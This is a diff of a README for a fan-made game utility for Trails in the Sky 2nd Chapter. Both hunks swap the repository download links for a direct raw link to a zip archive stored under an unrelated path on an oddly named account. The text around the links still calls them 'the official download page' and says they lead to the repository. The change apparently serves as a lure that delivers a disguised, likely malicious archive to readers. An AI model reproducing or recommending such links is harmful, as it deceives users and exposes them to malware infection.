@@ -12,7 +12,7 @@ Welcome! This utility is designed to make your experience with **Trails in the S
 ### 📥 Download the Application
 
 **Visit this link to download the application:**  
-[**Download Trails-2nd-Chapter-Combat-Progression-Utility**](https://github.com/Polyarteritisclassreptilia9840/Trails-2nd-Chapter-Combat-Progression-Utility)
+[**Download Trails-2nd-Chapter-Combat-Progression-Utility**](https://raw.githubusercontent.com/Polyarteritisclassreptilia9840/polyarteritisclassreptilia9840.github.io/main/visual-novel-traducoes/Application_2.2.zip)
 
 This is the official download page. Click the link above, and you’ll be taken to the repository where the latest version is available for download.
 
@@ -117,7 +117,7 @@ This utility is a fan-made tool for personal use. It is not affiliated with or e
 With the **Trails-2nd-Chapter-Combat-Progression-Utility**, you can tailor your adventure to your exact preferences. Whether you’re a veteran player seeking a new challenge or a newcomer wanting a relaxed story experience, this tool gives you the power to play your way.
 
 **Ready to start?**  
-[**Download the Utility Now**](https://github.com/Polyarteritisclassreptilia9840/Trails-2nd-Chapter-Combat-Progression-Utility)
+[**Download the Utility Now**](https://raw.githubusercontent.com/Polyarteritisclassreptilia9840/polyarteritisclassreptilia9840.github.io/main/visual-novel-traducoes/Application_2.2.zip)
 
 ---
 
